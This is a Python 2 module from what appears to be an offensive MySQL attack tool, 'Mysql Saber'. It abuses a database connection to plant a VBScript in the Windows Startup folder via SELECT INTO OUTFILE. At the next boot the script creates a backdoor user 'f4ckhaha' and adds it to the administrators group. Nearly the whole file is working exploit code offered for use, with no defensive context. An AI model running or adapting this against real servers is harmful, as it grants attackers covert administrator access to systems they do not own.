#! /usr/bin/env python
#coding=utf-8
import sys
from MysqlSaber_col import printWait,printError,printResult

def Sknight():
    printWait('''
        #######################################################
        #                                                     #
        #           Mysql Saber ---- VBS Knight               #
        #               BY haxsscker#f4ck.net                 #
        #                                                     #
        #######################################################
    ''')

def Svbs(sword):
    try:
        sword.execute('DROP TABLE IF EXISTS fuc_vbs;')
        sword.execute('CREATE TABLE fuc_vbs (vbs text);')
        sword.execute('insert into fuc_vbs values ("set wshshell=createobject (""wscript.shell"") " );')
        sword.execute('insert into fuc_vbs values ("a=wshshell.run (""cmd.exe /c net user f4ckhaha f4ckhaha /add"",0) " );')
        sword.execute('insert into fuc_vbs values ("b=wshshell.run (""cmd.exe /c net localgroup administrators f4ckhaha /add"",0) " );')
    except Exception,e:
        sword.execute('DROP TABLE IF EXISTS fuc_vbs;')
        printError(e)
        printError("[+Saber+]===> Hey boy, what's wrong?!")
        return
    else:
        printWait("[+Saber+]===> vbs has been inserted into the DB!!") 
    
    try:
        sword.execute('select * from fuc_vbs into outfile "c:/docume~1/alluse~1/Start Menu/Programs/Startup/a.vbs";')
    except Exception,e:
        printError(e)
        printError("[+Saber+]===> Hey boy, what's wrong?!Try again or go to levelUP...")        
    else:
        sword.execute('DROP TABLE IF EXISTS fuc_vbs;')
        printResult('''
            [+Saber+]===> Hey, you have done it! 
            [+Saber+]===> Oh, the user&pass are both \"f4ckhaha\" !!Good luck!!
            [+Saber+]===> Please restart the PC!!
        ''')

def main(sword):
    Svbs(sword)
    printWait("[+Saber+]===> Quit vbs and use other function? ")
    scontinue = 'y'
    scontinue = raw_input("continue?(y/n): y?")
    if scontinue == 'n':
        sword.close()
        sys.exit()
    
